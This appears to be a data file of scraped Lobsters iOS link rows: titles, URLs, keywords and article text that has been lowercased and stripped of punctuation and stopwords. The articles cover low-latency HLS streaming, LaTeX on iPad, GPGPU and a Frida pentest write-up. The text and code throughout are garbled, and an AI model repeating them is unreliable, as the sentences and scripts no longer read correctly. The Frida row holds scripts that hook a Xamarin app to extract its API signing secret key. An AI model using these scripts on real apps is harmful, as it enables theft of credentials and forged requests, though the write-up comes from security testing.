becomes available downloadalone actually think alhls bad specification complicated yes lot moving part yes make fundamentally bad nothere thing think elegant sure reserved use query parameter change playlist generation behavior liking neither blocking playlist request behavior let take look detail area going challenge implementation perspective alhls implementation challengesquery parameter usagemost playlist request use query parameter part content security mechanism meaning part url playlist signed order stop unauthenticated user accessing content introducing new functional query parameter url introduces extra complexity signing caching implementation playlist request well introducing new challenge third party player developmentblocking playlist reloadsblocking playlist request certainly going headache maintain current documented timeout behavior seems unclear frustrating monitor target duration beyond strategy open interesting quite concerning security performance concern web cdn server push scalehowever biggest challenge adoption apple approach mandatory use announcement apple touted widely adopted cdns surface true statement really hold true feature apple require server push work allowing server node cdn case push object back client without client asking pretty cute come major headache talking using scale name brand cdns push unimplemented many cdns good general coverage big name cdns push le widely implemented really suck one important consideration making implementing large scale streaming service day multicdn strategywhere push implemented usually use preload keyword link header origin response cause cdn link together two object cache push linked object appropriately however brings u problem able push medium along playlist response use edge endpoint playlist request medium request previously case hl sensibly support absolute url medium segmentsthis massive headache many vendor spent year building system separate responsibility playlist medium delivery since differing scale requirement playlist small text file gzipped change frequently medium segment large binary chunk created never change playlist fast easy generate fly medium segment le socommunity low latency hl lhls let talk little bit differs community developed lhls solutionhlsjs conjunction variety others including mux jw player wowza elemental akamai collaborating community driven approach implement low latency streaming using hl well year much discussion around formal standard found github issue initial concept term come periscope blog article published describing implemented approach low latency hl streaming read article herethe approach actually simple much simple alhls apart simple new playlist semantics lhls us strategy used delivering low latency mpeg dash http chunked transfer encoding chunked transfer encoding great fit allows start sending http response chunk data complete response availablethis helpful let send apple calling part segment video encoder generates back client start playing soon get without needing wait full segment available really great thing chunked transfer mode available overwhelming majority cdns much widely supported push todaybeyond simple availability approach actually allows le busy action client device comparison alhls surface lhls maintains traditional hl paradigm polling playlist update grabbing segment however ability stream segment back encoded actually reload playlist often alhls still polling playlist many time second looking new part available even pushed back manifest requestit would amazing see apple bring concept developing alhls mainly delta playlist lhls approach combined would made elegant powerful solution apple involve community lhls great supported community apple get involved honestly know apple decision ignore preexisting community standard particularly new apple certainly giving sign last year starting move alignment rest video streaming industrywhile apple never adopted mpeg dash streaming standard competitive standard hl despite involved dash industry forum couple year ago started supporting cmaf medium chunk support available overwhelming majority apple device meant dream delivering one set medium segment one way one endpoint including lowlatency mode finally starting become realityhowever dash ongoing standardization lhls style chunked transfer delivery lowlatency streaming seems apple forcing u back segregated delivery stack strategy order support alhls even hot end streamthe biggest challenge many hl video platform vendor going mandatory push also strongly suspect key apple chose go direction one big challenge alhls lhls problem bandwidth estimation order deliver great streaming experience able measure respond change user bandwidth historically estimating user available bandwidth easy measure long last medium segment took download check size segment simple math give good bandwidth estimationin chunked transfer world however estimating bandwidth expect every segment take exactly long took generate download easy need alternate bandwidth performance measurement could use playlist fetch using small reference file occasionally using full segment something elsemy working theory apple want solve problem way leaving option allow avplayer apple streaming framework able measure performance individual chunk chunkedtransfer response suspect apple decided interested adding new functionality legacy http stack device order support thisnow said push absolutely solve problem apis modern browser device allow check download performance push response blocking playlist request situation actually worse measuring performance blocking playlist fetch along segment load give accurate measurement use playlist download performance proxy assume apple way measuring performance device used reason way low latency strategy work adaptive bitrate allude specification partial segment must completely available download full speed link client time added playlistanother way look decision classify classic apple like first time apple taken strongly opinionated deprecation timeline though decision tend rooted physical hardware headphone jack usba physical escape name couple apple king maybe get alhls lhls dongle tooalhls nonapple devicesapple beta low latency compatible io device right even latest safari technology preview macos support told time however apple device really tiny part hl ecosystemit worth keeping mind amount hl get delivered nonapple device huge player like hlsjs videojs hl implementation supporting billion impression every day let assume video industry follows apple spec pivot away current approach pursuing last year twoso would alhls easy implement modern browser device really choice technology namely apple selected going make really hard nonapple device implement alhls yes includes hlsjs apple us website developer young technology tooling work severely limited web apis browser yet mature enough build lowlatency streaming technology top implementation likely apple able make work well safari eventually since leverage private apis rest browser world likely going change rapidly order support debug third party implementation alhlsso go hereobviously sure apple performed lot due diligence investigated lhls extensively however big challenge need worked implementation apple specification readycustomers video streaming industry desperate low latency solution compete like twitch twitterperiscope community lhls strategy real available implement today indeed many nothing stopping implementing backwards compatible way across major browsersapple alhls however clearly many month away even io since likely ship io earliest joined limited availability push major cdns requirement use single edge hostname apple new app verification alhls mean unlikely see large scale deployment alhls yet join wanting offer experience technology desktop web player also wait web player catch dramatically complex alhls implementation leaf vendor customer challenging position industry figure vendor continue forge forward chunkedtransfer based solution go allin apple new alhls fair say lot people industry lukewarm best reaction apple alhls specification ignoring community developed option pushing excessively future facing approach exactly new ground really shame see lack conversation case swift apple becoming much community centric organizationoh well guess got work photo snow white seven dwarf disney
130,Lobsters,ios,Apple iOS,LaTeX Workflow on iPad,https://supertachyon.wordpress.com/2019/06/13/37/,latex workflow ipad,introduction tex writer textastic working copy setup offline pdflatex compiler tex writer tex live tex user group reference manual customisation file text editor textastic example code completion file latex unofficial reference manual git client file provider working copy workflow gitignore conclusion like,introduction proud owner macbook pro retina year service became bit unsatisfying term performance finally decided build desktop pc partly fullfil craftsman desire partly play graphic intensive game still hanging around macbook mainly portable device medium consumption academic work felt bit heavy kind usage maybe wanted get rid play new toy sold used money get ipad pro wifi model storage since mostly happy owner ipad using ipad pro main computing device two year put love pc cost three time pc fantastic powerhorse mostly used dedicated gaming machine pc also serf last resort thing ipad incapable albeit resort shrinking constantly get competent utilising power ipad quite lot online resource covering usage ipad primary device however workflow mostly professional blogger podcasters programmer artist little found academic kind expected introvert group people world needed figure academic workflow ipad particular writing typesetting latex essential academic mathematics related area yet trivial matter get going smoothly ipad reason mostly lack software documentation lack research area fiddling relevant apps could find even including remotely relevant one think finally established optimal workflow apps involved tex writer textastic working copy describe setup workflow following section setup offline pdflatex compiler tex writer get barebone workable experience writing typesetting latex latex distribution eg tex live course needed however obvious bring tex live onto ipados turn possible install full tex live lost least get full pdflatex working ipados help tex writer although one competitor ipados offline typesetting capability namely texpad tex writer excels almost every way solid file manager file app integration support multitasking technology ipad perfectly ton customisation scripting capability show tex pdf simultaneously horizontal split landscape vertical split portrait orientation moreover transparent package management solution ie old way managing file showing entire directory thing probably hold people back tex writer like app written developer example editor draw inspiration emacs customisation requires editing plain text configuration file installing tex writer already shipped minimal tex live distribution typesetting document requires additional package downloads required package dynamically ctan cache however best thing allows user preload package font etc need create new folder texmflocal copy package want theoretically put entirety tex live good idea since pdflatex related file used tex writer would waste lot storage ipad due le robust file system ipados amount file often crash file app best way get full pdflatex working offline ipad load part tex live useful tex writer described download tex live installer supported operating system tex user group run installer open advanced dialog select collection package needed install wait finish open package manager install additional package open installation directory navigate foler texmfdist create texmflocal direcotry root tex writer optional create hidden folder texlive texmflocal tex file shown indexed file app make sure show hidden file option enabled setting tex writer copy folder tex font bibtex texmflocal texmflocaltexlive folder tex writer via itunes open setting tex writer tap refresh texmflocallsr next typeset tex writer might take long time update lsr better set io auto lock never let tex writer finish job foreground whole process caveat need mention advisable install many additional font tex live collection file system io still bit fragile furthermore might still useless file copied three folder serious chore dig tex directory pick one think good compromise make customisation scripting tex writer developer website reference manual first half lisp language specific tex writer best way start scroll bottom look sample twininitl file need copied tex writer important feature documented website pasting block code twininitl file tex writer add reload button tex mode compile button pdf mode important editing file apps typesetting tex writer uploaded copy customisation file github addhook texmodehook lambda addtotoolbar reload reload addhook pdfmodehook lambda addtotoolbar compile texcompile text editor textastic although text editor tex writer actually decent beautifully implemented feature like spellchecking textastic text editor choice one important reason allows user customise code completion developer example builtin code completion configuration file github unfortuanately syntax documented took solid couple hour figure written code completion file latex available github based unofficial reference manual git client file provider working copy might noticed trend github used lot surprised entire latex setup based git file management working copy integrated io file provider make file repository available apps tex writer textastic take full advantage basically source file latex document eg tex bib file stored working copy version controlled git textastic tex wrtier open place edit compile workflow typical workflow writing typesetting latex document setup following initiate repository working copy gitignore file untrack intermediate file generated latex optional push repository git hosting service say github open repository textastic create new tex file type document open repository tex writer compile tex file see pdf continue edit textastic compile tex writer done commit meaningful change working copy process check correct spelling final draft tex writer compile final document tex writer commit push final change working copy due large amount app switching tex writer textastic workflow best open side side split view put tex writer slide conclusion although setup significant effort least result worthwhile opinion write typeset document latex almost anywhere bringing ipad much easier bringing macbook becuase lack weight limitation also quite limited unless need typesetting engine eg xelatex fontspec luatex tikzfeynman etc ipad pro serve perfectly well updated jul like like loading
131,Lobsters,ios,Apple iOS,Apple's implementation of Low Latency HLS Explained,https://www.linkedin.com/pulse/apples-implementation-low-latency-hls-explained-phil-harrison,apple implementation low latency hl explained,full video available preliminary spec background intrinsic latency network latency forward buffer latency network latency forward buffer latency apple done hl support low latency network latency huge reduce publishing latency eliminate segment round trip extxpreloadhint reduce playlist transfer overhead switch tier quickly additional detail io client cdn requirement origin requirement closing thought,apple taken wrap implementation lowlatency hl streamingthe full video available along preliminary spec article discus background attempt explain feature apple implemented whybackgroundi previously written intricacy ott latency tl dr version basically three part ott latency discussion must summed together intrinsic latency network latency forward buffer latencyintrinsic latency come production video stream thing like contribution location studio graphic compositing commentary add delay presentation even distributed consumer usually order mid single digit second equal latency experienced legacy broadcast mean fm radio getting latency ott seen holy grailnetwork latency equal least efficient component network stack client origin includes thing like protocol tcp http hlsdash etc round trip time bandwidth available cdn caching behavioursthe forward buffer latency much latency player chooses start good latency quality perspective latency buffer adverse network condition content exists forward buffer le likely consumer experience rebuffering eventthe problem reducing ott latency complex problem many compromise make work scale sacrificing forward buffer mean ott operator must willing also sacrifice quality degree improving network latency compromise scalability robustness reducing intrinsic latency mean lot complexity cost production workflowhls compared mpegdash significant drawback came network latency forward buffer latencybecause hl client poll server discover new segment inherent cost approach poll request cdn cached almost universally translates latency equal ttl time live value configured type request cdn back forth client server lot value time consumed chattiness protocolon forward buffer side client following hl rfc start playback point segment behind last available segment segment duration second equates healthy forward buffer second turn massive amount latencywhat apple done hl support low latency apple updated hl specification new draft protocol aptly named lowlatency hl effectively suite change predominantly address network latency part problem broad change detail belowimportantly specification fully backwards compatible previous version hl however client need running leverage featuresfirstly server signal client configured support low latency feature extxservercontrol along attribute define exact function availablenext client choose send configuration query string parameter modify resulting playlist server sidethis huge departure hl long lasting ramification industry adoptedhistorically hl origin cdns immune query string parameter client could send anything query string http request would affect response server lead fairly prolific live streaming architecture whereby encoderpackager prepublish push file directly cdn turn simply ignore query string meant file viewer easily cacheable longer caseapple reserved query string key beginning hl mean order support apple low latency hl cdn need include query string match pattern object cache keyyou also need run server side software modify hl manifest file per instruction query string parameter client apple seem made reference php library available purpose edit onto actual reduce publishing latencyif encoder ability publish subsegments origin either cmaf chunk partial t hl ability discretely address subsegments mean may keep full segment duration recommended second make available subsegments recent segment parallelthis signalled playlist like example full segment available entirety however every new subsegment current bleeding edge segment signalled would require packager capable generating update generating medium file least frequently duration subsegmentone approach might simply stream segment currently encoded using chunked transfer encoding origin write fancy server side script generate subsegment byterange offset location rather discrete file apple example abovethere still exists big problem client still poll segment availability cdn cache request say second subsegment duration anything le second wasted extent client send two set query string order achieve two important thing bust cache get new origin instruct origin respond available instead hold connection open segment duration requested manifest sequence availablethis done combination hlsmsn n instructs origin client interested playlist contains medium sequence number n hlspart instructs origin client interested playlist contains part medium sequence nfor example instructs cdn origin respond request playlist available contains part medium sequence full segment playlist part partial segment server respondthis fascinating concept quite flexible see encoders packagers cdns racing implement feature connection held open multiple second however something remains seen large scale expected behaviour fact cdns assume origin slow give something need comprehensively eliminate segment round update original information superseded new tag extxpreloadhintthe issue server push described originally describe two fold requires cdn support push origin cdn edge requires segment served host second issue especially problematic cdns inherently distribute load across many host thing like dynamic server side ad insertion also frequently result playlist reference segment across multiple domain first issue tractable problem would required multiyear industry wide effort extxpreloadhint tag allows server signal client uri upcoming segment within playlist rather hypothetical link http header client would able make speculative request segment available future cdn shall hold request open rather return behaviour blocking request discussed article place special requirement server cdn support server push thus mean llhls latest form ready mass market adoptionoriginal text apple also introduced server push hl specification essentially client pas via query string time boolean whether recent partial segment bottom list pushed parallel responsehistorically hl client would need download full response enumerate sequence make seperate http request segment often wasting several hundred millisecond processcdns need support push able intrinsically understand object push along side cached response feature significant reduce playlist transfer overheadanother long standing issue hl live stream perpetually growing manifest file say publishing test match cricket game average last hour second segment equate segment attribute resulting multi hundred kilobyte file even gzip take significant time download compounded update frequency every secondsimagine issue trombone introduction partial segment every clearly signal via query string hlsskipyes instructs server send delta last playlist nowthe resulting manifest insert extxskip lieu actual segment case servercontrol attribute canskipuntil also set horizon le segment live switch tier quicklyfinally apple also introduced new method hl client switch representation acutely representation switch process used require healthy forward buffer client would comfortable start seek higher quality representation forward buffer dropped certain number second client would fall back lower quality representation hope increasing forward bufferthis logic break forward buffer hundred millisecond time run logic playback stall ie rebuffer end include request used include segment availability hint adjacent representation one currently requested server include hint inline request playlist via extxrenditionreport tag bottom playlist attribute least currently available segment medium sequence id part numberadditional detailsios clientsapple provided client side apis one control forward buffer latency therefore estimated latency another control behaviour recovering stall ie rebuffer event ultimate low latency application instruct io client catch live edge discard missed frame rebuffer eventthe specification preliminary stage meaning need test thoroughly going production presentation roger panto indicated specification rolled wider hl rfc later yearcdn requirementsalmost cdns aware cache query string configured hl delivery mean least testing cdn configuration taken architecture worked parallel ensure compliance concept beta period anyway apple app make app store validationorigin requirementsapple made available origin php script encapsulates server side feature require hl lowlatency discover said package make available articleclosing thoughtsapple really late party already numerous attempt extending hl specification low latency notably lhls approach apple taken require enormous retooling packaging cdn client side however appear carefully consideredi look forward ott streaming community implement
132,Lobsters,ios,Apple iOS,WWDC 2019,https://www.apple.com/apple-events/livestream/,wwdc,,watchos watchos discover custom watch face website social medium share face friend also meet sleep app dream track fitness metric four new workout create healthier habit new handwashing feature see preview
133,Lobsters,ios,Apple iOS,Hacking IOS Xamarin apps with Frida,https://orangewirelabs.wordpress.com/2019/05/30/hacking-ios-xamarin-apps-with-frida/,hacking io xamarin apps frida,method instantiating config class method intercepting c method result http infocenterarmcomhelpindexjsp research burp integration like,recent test tasked breaking api used io app usual thing setting fake wireless ap transparently piping web traffic burp straight away noticed app signing request amazonstyle signing process could see request burp replay alter api accept anything signed extracting ipa file resulted whole folder full looked like net dll file associated aotdata file digging showed app based xamarin framework totally normal something panic point thought hey neat throw dnspy read nicely formatted code greeted nothing unimplemented empty header class method turn apple allow kind exciting emulated interpreted stuff platform xamarin based net would fall category get round code compiled ahead time aot dumped bunch file figure decompile mono runtime performs magic load memory demand redirect function call mean two thing probably way beyond arm reverse engineering skill frida cant see function run fridatrace tool point took step back actually redefine problem focus bit decided ultimate aim find value used sign request android version could probably reverse engineer signing process c header mentioned turned useful eventually digging found class contained field called accessid secretkey class called appsettings however werent set initialisation time value werent c part app read also two method called getaccessid getsecretkey probably needed two obvious path take instantiate copy setting class call get method two field wanted read intercept call method steal result return value managed note anyone else stuck situation whole bunch really useful tool dealing mono code via frida recommend installing method instantiating config class first step install tool make sure work deploy frida rooted iphone bundle gadget repackagedsigned ipa first plenty tutorial internet wont repeat going inject script app instantiates class want call method need wrapper script const fridainject require fridainject const frida require frida async function main const device await fridagetusbdevice fridainject name thingy device device clean true script consolelog let break stuff onattach session consolelog attached process ondetach session reason consolelog detached process onload script consolelog script loaded onunload script consolelog script unloaded main going walk writing script script going find c assembly contain class want use find method class want use within assembly instantiate appsettings class run getaccessid getsecretkey method new object unbox structs method returned go unboxing thing encounter anyone thats done really similar programming c using reflection first find reference class constructor create object call constructor etc first step write helper find reference class get used lot worth spending time function getclass name var k monoapihelperassemblyforeach function assemb var image monoapimonoassemblygetimage assemb var klass monoapihelperclassfromname image name klass k klass return k return pointer given class found use like var appvalueclass getclass comthingyiosplatformspecificappsettings start creating object type start need reference current appdomain everything create within think way segmenting c apps luckily mono runtime extension frida mono tool library provides method const domain monoapimonodomainget create empty object type var iosappsettingsobj monoapihelperobjectnew appvalueclass domain variable pointer newly allocated object note run constructor method likely nothing initialised field want empty need run ctor method get object ready use referring decompiled c code see iosappsettings class contstructor requires instance pluginsettingssettingsimplementation run go get reference class like create empty one run constructor var pluginklass getclass pluginsettingssettingsimplementation var pluginobject monoapihelperobjectnew pluginklass domain var pluginconstructor monoapihelperclassgetmethodfromname pluginklass ctor var result monoapihelperruntimeinvoke pluginconstructor pluginobject null done pluginobject ready stuck constructor iosappsettings object get reference constructor apply object created call plugin object also noticed method called loadapplication look important let find run var appvalconstructor monoapihelperclassgetmethodfromname appvalueclass ctor var monoapihelperruntimeinvoke appvalconstructor iosappvalueobj pluginobject var method monoapihelperclassgetmethodfromname k loadapplication var result monoapihelperruntimeinvoke method iosappsettingsobj null point result contain fully instantiated loaded copy app setting field interested try read first thing get list field class var field monoapihelperclassgetfields appvalueclass also need reference systemguid tostring class var systemguidklass getclass systemguid var guidtostring monoapihelperclassgetmethodfromname systemguidklass tostring need iterate read value field name accessid secretkey pull value unbox resulting value call tostring resulting guid object print hard part spent day wondering result tostring call looked like pointer value didnt realise systemguid actually struct object order return mono box object represented pointer following pointer gave u actual pointer call tostring code look little like fieldsforeach function f var fr monoapihelperfieldgetvalueobject f result var v non var fn monoapihelperfieldgetname f fn accessid fn secretkey consolelog pulling fn var unboxfr monoapimonoobjectunbox fr var r monoapihelperruntimeinvoke guidtostring unboxfr null v r else v fr consolelog fn v print object field hopefully include accessid secretkey field name thingyios version language engb region gb pulling accessid accessid xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pulling secretkey secretkey xxxxxxxxxxxxxxxxxxxxxxxxxxxxx value wasnt fun neat concept demonstrated script find read c definition object find create run method return result method intercepting c method result start post mentioned couldnt seem run fridatrace c method exposed aot compiled code research managed find method intercepting c method using main frida tool general plan find method name class want trace c header mangle match odd format aot compilation process applies find reference function memory using frida write interceptor function catch function called grab response first step want find getsecretkey method comthingyiosplatformspecificiossettingsvalues class aot compiler run creates c method every c objectmethod compilation method used mono runtime look method procedure link table plt load corresponding code using dynamic loader method name get messed put plt example comthingyiosplatformspecificiossettingsvaluesgetsecretkey becomes comthingyiosplatformspecificiossettingsvaluesgetsecretkey hunt method name using fridacli root phoenix fr frida worldclass dynamic instrumentation toolkit command help display help system object display information object exitquit exit info http wwwfridaredocshome io device thingy debugsymbolfindfunctionsmatching comthingyiosplatformspecific io device thingy debugsymbolfindfunctionsmatching search function using wildcards response pointer function converted name piping map call io device thingy debugsymbolfindfunctionsmatching comthingyiosplatformspecific map debugsymbolfromaddress join n thingyios comthingyiosplatformspecificiosappsettingsgetaccesskey thingyios comthingyiosplatformspecificiosappsettingsgetsecretkey notice getaccessid getsecretkey method bingo know full name method write interceptor tool var funcptrs debugsymbolfindfunctionsnamed comthingyiosplatformspecificiosappsettingsgetsecretkey var funcptr funcptrs interceptorattach funcptr onenter function args consolelog key called args args onleave function ret var final consolelog secret key final run frida u f thingy l keyjs nopause notice f full app name display name want start script app start kill first phone file containing script make sure app start frida attache app start phone script run search function trap wait called frida worldclass dynamic instrumentation toolkit command help display help system object display information object exitquit exit info http spawned thingy resuming main thread io device thingy key called args key done access id key called args key done secret key io device thingy here fun part return value ret onleave function contains half guid mangled format think guid stored pair value internally examine register call end see half register pc sp etc reading documentation show register used parameter passing result returning register http infocenterarmcomhelpindexjsp cant quite see decode value guid automatically easy enough enough thinking actual test value quite obviously one returned method counting win method used track intercept c call application make need figure name first reading value argument response challenge though method return object likely return pointer follow monoobject represents need start reading mono source code figure format struct pull data managed simple thing like reading name class method memory challenge bigger object research burp integration someone created burp plugin called brida allows call native method burp data could really useful application sign request like example possible reverse engineer signing process may possible bundle burp request object pas signing tool app get phone send challenge getting brida spot c method plt frida see use fridatrace find cant probably possible use object creation stuff ie create whatever request object app us fill data dont know garbage collection work likely app die burp thrash request like like loading
134,Lobsters,ios,Apple iOS,Exploring GPGPU on iOS,https://ciechanow.ski/exploring-gpgpu-on-ios/,exploring gpgpu io,note better way gpgpu solved problem github repo disappointing linear function promising complication exponential decay damping amazing iteration newton law universal gravitation euler method transform feedback definition short article much longer tutorial gltransformfeedbackvaryings writing reading buffer shader calculation simple vector operation language specification opengl e api reference card example shader processing power multiargument function single argument multivalued function multiargument multivalued function build setting caveat bug data size computation complexity disappointing linear function fused multiplyadd promising complication amazing iteration precision comparison bruce dawson article series floating point format disappointing linear function promising complication reason ieee every computer scientist know floatingpoint arithmetic rounding mode matter rely math library perform calculation final word claim private opencl,january note article obsolete better way gpu computation modern io device keeping historical reference always wanted try gpgpu programming io idea harnessing highly parallelized power tickled inner geek using gpu run image processing already solved problem unfortunately fragment shader calculation support notion general computation advent chip opengl e decided tackle problem managed get exceptionally good result granted method rolled limitation performs well fairly computationally heavy situation work work like magic companion article created github repo contains source code many discussed concept well benchmark run measure effectiveness gpu computation earth would one want use gpu calculation answer obvious blazingly fast speed following paragraph consider three different use case increasing complexity presented example somehow intention highlight typical pattern application might benefit gpupowered calculation example contains cpu v gpu comparison chart result direct computation presented problem timing measured ipad air generation ipad io beta disappointing linear function let start basic function linear function countless application linear function let pick one see well performs compare performance gpu cpu using time obvious choice focus raw millisecond comparing runtime small large input set would render former one useless would merely visible plot pitifully overlapping horizontal axis instead consider ratio cpu gpu time making cpu performance normalized make gpu value easy interpret gpu performs twice fast cpu gpu value comparison chart gpu v cpu computed linear function horizontal axis chart represents number input float value logarithmic scale see gpu suck case even large input set million value gpu run time fast cpu ie run time slower promising result performance increase input size sufficiently large data set gpu would overcome cpu notice however representing float value already take mb memory surely hit memory limit reaching beneficial performance level promising complication since linear function disappointing let reach complicated function math repository exponential function transpires many natural phenomenon eg exponential decay paired basic trigonometry function form solution many differential equation like one rule damping let consider following complicated mixture exponent sine cosine random coefficient f x exp x sin x co x comparison chart gpu v cpu execution time first success soon input size cross little value gpu faster cpu large data set gpu time faster amazing iteration exciting result previous example even better let consider iterative computation imagine simulation huge number body central gravitational field let make assumption body mass body initial position different initial velocity ignore bodytobody interaction problem two dimensional goal calculation answer question far body flown second word position every single body second reaching back fundamental physic simple equation come mind p unfortunately merely plug value get result one step acceleration body constant depends distance field center simple solution run calculation iterative fashion like physic engine given position space get body acceleration measuring value gravitational force governed newton law universal gravitation since merely example ignore constant coefficient notice force proportional distance squared point center field let focus gist iteration step evaluate current acceleration value update value position velocity using forward euler method body iterative loop go follow float l x x float ax x l l l float ay l l l x vx dt vy dt vx ax dt vy ay dt let settle time step second running loop time result good approximation body position without ado gpu v cpu comparison computation right gpu time faster sixty four time faster example somehow contrived space ignoring body body collision result astonishing term absolute time cpu calculation took second gpu took third second work even float input value two dimensional vector gpu almost twice fast cpu developer perspective typical gpu programming work follow submit vertex geometry process vertex shader let gpu figure triangle process fragment fragment shader present result screen vertex fragment shader customizable far fragment shader output accessible developer form generated framebuffer long story short using new feature opengl e called transform feedback access output vertex shader transform feedback excerpt definition transform feedback transform feedback process capturing primitive generated vertex processing step recording data primitive buffer object allows one preserve posttransform rendering state object resubmit data multiple time crucial part preserve posttransform rendering state basically let gpu work vertex data access computed output actually even vertex data per se gpu happily make operation whatever float value provide essence method setting transform feedback opengl take dozen line code done help short article much longer tutorial setup split two different step first inform opengl shader variable used write output data memory buffer stage must happen shader get linked following two line code present setup crucial call gltransformfeedbackvaryings const char varyings gltransformfeedbackvaryings program sizeof varyings sizeof varyings varyings glinterleavedattribs second stage similar regular draw call setup although enriched additional api call gluseprogram program glenable glrasterizerdiscard discard primitive rasterization stage glbindbuffer glarraybuffer readbuffer bind vao configure vertex attribute glbindbufferbase gltransformfeedbackbuffer writebuffer output written writebuffer glbegintransformfeedback glpoints gldrawarrays glpoints count glendtransformfeedback gldisable glrasterizerdiscard glfinish force calculation happen note difference desktop mobile opengl implementation instance compile vertex shader provide dummy implementation fragment shader well apparently requirement desktop opengl final step remember include header writing reading buffer unlike traditional pc io device unified memory architecture matter whether read write regular memory opengl allocated buffer pool ondevice transistor done crude test fact reading opengl regular memory take amount time true writing memory well desktop pc memory transfer usually take nontrivial amount time io however generate data directly opengl accessible memory also read back well without apparent penalty fantastic feature io mobile gpgpu platform accessing data pointer reading super easy glbindbuffer glarraybuffer sourcegpubuffer float memorybuffer glmapbufferrange glarraybuffer buffersize glmapreadbit read memorybuffer glunmapbuffer glarraybuffer accessing pointer writing glbindbuffer glarraybuffer targetgpubuffer float memorybuffer glmapbufferrange glarraybuffer buffersize glmapwritebit write memorybuffer glunmapbuffer glarraybuffer wrapping data readingwriting logic additional line opengl boilerplate surely worth added benefit shader calculation opengl e shaders written glsl e much clike sweet vector matrix addition simple vector operation glsl defines type four component vector x z w component language specification definite guide matter simple operation worth glancing let b glsl variable type one easily multiply vector component scalar float c r c rx ax c ry ay c one also multiply two vector componentwise r b rx ax bx ry ay well feed entire vector plethora builtin function r exp rx exp ax ry exp ay highly recommend opengl e api reference card short primer opengl api well glsl cheat sheet contains list builtin function generally recommended use instead manually recoding even trivial functionality builtins may direct hardware implementation thus faster handwritten counterpart example shader simplest shader written glsl e double input vector version e invec outvec f x return x void main outvec f invec see readable return transformed input vector marked output vector marked processing power bother four calculation operation instead calculating single float value separately crunching entire vector way faster quick benchmark showed using one operation instead four float one time faster even surprising even return one single shader calculation use vector feed data shader seemingly arbitrary number platform specific value maxvertexattribs constant set stone device output vector limited glmaxtransformfeedbackinterleavedcomponents constant equal mean define variable type since component knowledge extend shader take input generate output version e f x return x void main f f f f utilizing method one achieves much faster execution instance going inout vector pair inout vector pair result time performance increase disappointing raise example case however sweet spot promising plot even vector pair amazing simulation must tuned manually case case basis obviously writing much code hand changing piece function call place tedious github implementation generates shader given number vector responsibility programmer provide source f x function multiargument function throughout previous example used simple function take one argument return one value however hard write complicated function take arbitrary moderation number argument let consider multiargument function f b c b c term math definition function r want calculate single float value slow instead calculate four value entire value therefore simple shader would three vector one vector assuming contains value contains value shader code trivial f b c return b c adding vector another option data fetched single continuous buffer ordering notice shader would pick separate component vector perform calculation one one hardly optimal single argument multivalued function let consider multiargument function b f x co x sin x mean f r function calculates location point unit circle given angle x use regular f x since output two vector function instead could make use f x function would transform two input value four output value clearly number shader vector would twice large number vector multiargument multivalued function finally let consider function r f b function take vector return vector considering previous case one might argue decay calculating two value regular f x function however hardly case instance define function return perpendicular vector f x x done plain old f x side note since calculation technically could lookup next component technique fairly limited mention extreme abuse blindly reducing r r usual want return much data possible going calculate two value function packing one f return ay ax aw az speaking crazy r r reduction consider function f x x case calculation decay regular f x calculation f return notice merely technical twist since shader care whether function r r patiently crunching number build setting caveat cpu v gpu comparison compiled program following setting optimization level fastest aggressive optimization ofast vectorize loop yes relax ieee compliance yes application built using xcode ran test io due bug apple developer account required io one apply user defined function inside shaders used transform feedback main builtins work unsurprisingly manual inlining body f function main work want use transform feedback io use function call write lot code make use vector time measurement taken running test time taking average seen much performance gpu offer use let discus factor influence application method data size computation complexity basically two requirement gpu powered computation triumph large data set non trivial calculation simple polynomial evaluation inside disappointing linear function case best example lowoverhead calculation calculation example fused multiplyadd usually executed single instruction moreover clang smart enough generate vectorized code computes four fused multiplyadds additional performance boost explaining cpu running circle around gpu case complex evaluation promising complication case show benefit parallelization large enough input simultaneous calculation performed gpu start winning finally amazing iteration allows gpu show potential cpu calculate case one one gpu crunch multiple case leaving cpu dust conclusion obvious huge overhead firing opengl machinery started better keep rolling one amazing benefit running calculation gpu firing calculation cpu free whatever want precision must noted value returned gpu calculation might equal value returned cpu gpu v cpu error large comparison bruce dawson wrote amazing article series floating point format part thereof presented genuinely cool way compare floating point value basically due internal representation floating point format interpreting bit float int incrementing integer reinterpreting new bit float creates next representable float number quote obviousinhindsight theorem integer representation two samesign float subtracted absolute value result equal one plus number representable float instance integer difference two float value mean one could fit float value quoting dawson difference integer representation tell u many unit last place number differ usually shortened ulp two float differ two reference also calculated value relative float error defined fabsf cpuvalue gpuvalue cpuvalue evaluated example refer integer difference ulp relative float value error flt unfortunately method issue comparing nearzero value general provide good overview going disappointing linear function ulp avg max min flt avg max min value calculated gpu little ulp away cpu result average low show le value exactly equal cpu computation promising complication ulp avg max min flt avg max min maximum ulp error jumped average ulp error increased well relative error still provides good indication value error insignificant amazing iteration ulp avg max min flt avg max min maximum value ulps hint iteration accumulated error relative error still low reason default precision float direct result well inside vertex shader set highp glsl e spec essentially regular ieee float difference comparison cpu result come familiarity secret floating point value great despite starting read every computer scientist know floatingpoint arithmetic couple time hypothesis take grain salt one reason effect could slightly different implementation exp pow trigonometry function however disappointing linear function use builtins small error still suspect important reason rounding mode inside glsl computation defined specification could explain iteration algorithm inside gpu result ulps difference matter obviously precision mission critical use float anyway jumping double instead thus skipping gpu calculation entirely record sake linking interesting rant rely math library perform exact calculation anyway mundane task precision matter unless thousand iteration inside shader game simple simulation care final word extremely pleased result really show gpus inside io device extremely powerful expected perhaps speed improvement extremity shocker case highly iterative calculation reduce wait time user minute little one second even though presented example somehow artificial benefit huge performance gain offloading cpu utmost importance without doubt using transform feedback limit effectiveness method brand new device powered chip time go become le issue work lot still done enables reading texture vertex shader although claim possible previous release well one could treat float texture source truly random random access random value memory resulting much advanced vertex shader computation technique however still solve random write problem hand one might also try going fragment shader way using float texture input half float texture output still provide full featured gpgpu capability effort become vein apple provides access private opencl framework opengl abuse primary toy u play
135,Lobsters,ios,Apple iOS,Metacode - autogenerated snippets for Swift and iOS,https://metacode.app,metacode autogenerated snippet swift io,fastest way navigate code,fastest way navigate code instantly find code using intuitive search code rank jdsnjkd
